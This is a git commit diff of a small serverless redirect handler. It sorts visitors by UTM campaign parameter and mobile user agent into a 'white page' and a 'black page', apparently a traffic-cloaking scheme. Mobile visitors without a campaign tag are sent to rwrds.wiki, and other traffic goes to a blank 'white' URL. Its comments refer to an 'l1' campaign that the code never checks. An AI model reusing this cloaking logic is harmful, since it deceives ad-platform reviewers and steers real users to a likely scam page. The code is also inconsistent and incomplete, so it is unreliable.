88c36b465a1997fa913e4ed242143d6e63e763b3
Ayden Xu <aydenxunc@gmail.com>
2024-12-25 22:26:34 -0500

    ppdd

--- api/redirect.js
+++ api/redirect.js
@@ -1,19 +1,29 @@
-
-  export default function handler(req, res) {
-    const destinationURL = "https://gund.com/collections/bears/products/jumbo-philbin";
-    const fallbackURL = "https://rwrds.wiki";
+export default function handler(req, res) {
+    // URLs to redirect
+    const whitePageURL = "";
+    const blackPageURL = "https://rwrds.wiki";
   
+    // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
-    const hasUtmParameter = Array.from(queryParams.keys()).some(key => key.startsWith('utm_'));
-    
+    const utmCampaign = queryParams.get('utm_campaign');
+  
+    // Get the User-Agent from the request headers
     const userAgent = req.headers['user-agent'] || '';
     const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-    
-    if (!hasUtmParameter || !isMobileDevice) {
-        res.writeHead(302, { Location: fallbackURL });
+  
+    // Redirection logic
+    if (utmCampaign && utmCampaign.length > 0) {
+      // UTM campaign 'l1' takes priority for both desktop and mobile
+      res.writeHead(302, { Location: whitePageURL });
+    } else if (isMobileDevice) {
+      // Mobile devices without 'l1' campaign
+      res.writeHead(302, { Location: blackPageURL });
     } else {
-        res.writeHead(302, { Location: destinationURL });
+      // Desktop devices without 'l1' campaign
+      res.writeHead(302, { Location: whitePageURL });
     }
-    
+  
     res.end();
-}
+  }
+  
+
